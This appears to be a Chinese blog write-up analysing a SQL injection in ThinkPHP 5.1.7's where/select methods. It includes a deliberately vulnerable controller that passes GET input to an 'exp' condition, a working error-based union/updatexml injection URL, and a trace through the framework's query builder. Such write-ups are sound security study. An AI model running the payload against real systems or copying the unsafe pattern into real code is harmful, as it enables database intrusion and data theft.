# 原创
：  ThinkPHP5 SQL注入（select方法）

# ThinkPHP5 SQL注入（select方法）

#### ThinkPHP5 SQL注入（select方法）

## 漏洞概要

> 



## 初始配置

> 



```
composer create-project --prefer-dist topthink/think=5.1  tpH3rmesk1t

```

> 
将 composer.json 文件的 require 字段设置成如下


```
"require": {
    "php": "&gt;=5.6.0",
    "topthink/framework": "5.1.7"
}

```

> 
然后执行 `composer update`


> 



```
&lt;?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $username = request()-&gt;get('username');
        $result = db('users')-&gt;where('username','exp',$username)-&gt;select();
        var_dump($result);
        return '&lt;style type="text/css"&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:)Gyan师傅永远嘀神！！！&lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style="font-size:30px"&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;think id="eab4b9f840753f8e7"&gt;&lt;/think&gt;';
    }
}
?&gt;

```

> 
在`config/database.php`文件中配置数据库相关信息，并开启`config/app.php`中的app_debug和app_trace,创建数据库信息如下


```
create database thinkphp;
use thinkphp;
create table users(
	id int primary key auto_increment,
	username varchar(50) not null,
);
insert into users(id,username) values(1,'H3rmesk1t');

```

## 漏洞利用

> 
Payload：


```
http://127.0.0.1/cms/public/index.php/?username=)%20union%20select%20updatexml(1,concat(0x7,user(),0x7e),1)%23

```

## 漏洞分析

> 
程序默认调用 Request 类的 get 方法中会调用该类的 input 方法，然后进到`thinkphp/helper.php`中的`db`方法，再进到`thinkphp/library/think/db/Query.php`中`where`方法，通过其 `parseWhereExp` 方法分析查询表达式，调用`select`方法


> 
再调用`thinkphp/library/think/db/Connection.php`中的`select`方法


> 
此处调用`$this-&gt;builder`的`select`方法，而此处`$this-&gt;builder` 为`think/db/builder/Mysql`类，继承于`Builder`类，因此调用的是`Builder`类的`select`方法


> 
在 `select` 方法中，程序会对 SQL 语句模板用变量填充，其中用来填充 `%WHERE%` 的变量中存在用户输入的数据，跟进这个 `where` 分析函数，会发现其会调用生成查询条件 SQL 语句的 `buildWhere` 函数，此处 `$where` 经过 `buildWhere` 方法处理后返回 `$whereStr`，期间调用 `parseWhereItem` 方法


<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/103daa8714a34c55bdd3b42b2947ce6a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/1e0f552362d64f0385aa32942440b4e6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>

> 
`parseWhereItem` 的 where 子单元函数方法调用，当操作符为 `EXP` 时，调用 `parseExp` 方法，经过拼接带入SQL查询，造成SQL注入


> 
完整的方法调用，从下往上


## 漏洞修复

> 
该漏洞未被官方修复


## 攻击总结

> 
参考Mochazz师傅的审计流程

